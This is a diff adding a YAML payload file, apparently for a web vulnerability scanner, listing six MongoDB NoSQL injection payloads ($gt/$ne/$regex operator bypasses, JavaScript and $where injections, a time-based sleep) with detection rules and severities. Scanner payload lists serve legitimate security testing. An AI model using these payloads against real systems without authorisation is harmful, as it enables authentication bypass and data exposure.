@@ -1,0 +1,48 @@
+id: nosqli-mongo
+name: NoSQL injection — MongoDB
+context:
+  powered_by: ["Express", "Node"]
+  technologies: ["MongoDB", "Mongoose"]
+
+payloads:
+  - value: "{\"$gt\":\"\"}"
+    detect: { status_change: true }
+    id: nosqli-gt-01
+    title: "NoSQL injection — MongoDB $gt operator bypass"
+    severity: high
+    cwe: CWE-943
+
+  - value: "{\"$ne\":\"\"}"
+    detect: { status_change: true }
+    id: nosqli-ne-01
+    title: "NoSQL injection — MongoDB $ne operator bypass"
+    severity: high
+    cwe: CWE-943
+
+  - value: "{\"$regex\":\".*\"}"
+    detect: { status_change: true }
+    id: nosqli-regex-01
+    title: "NoSQL injection — MongoDB $regex wildcard"
+    severity: high
+    cwe: CWE-943
+
+  - value: "' || '1'=='1"
+    detect: { status_change: true }
+    id: nosqli-js-01
+    title: "NoSQL injection — JavaScript string comparison"
+    severity: high
+    cwe: CWE-943
+
+  - value: "';return true;var a='"
+    detect: { status_change: true }
+    id: nosqli-js-02
+    title: "NoSQL injection — JavaScript injection in $where"
+    severity: critical
+    cwe: CWE-943
+
+  - value: "{\"$where\":\"sleep(3000)\"}"
+    detect: { time_based_ms: 2500 }
+    id: nosqli-sleep-01
+    title: "NoSQL injection — MongoDB $where sleep (blind)"
+    severity: critical
+    cwe: CWE-943
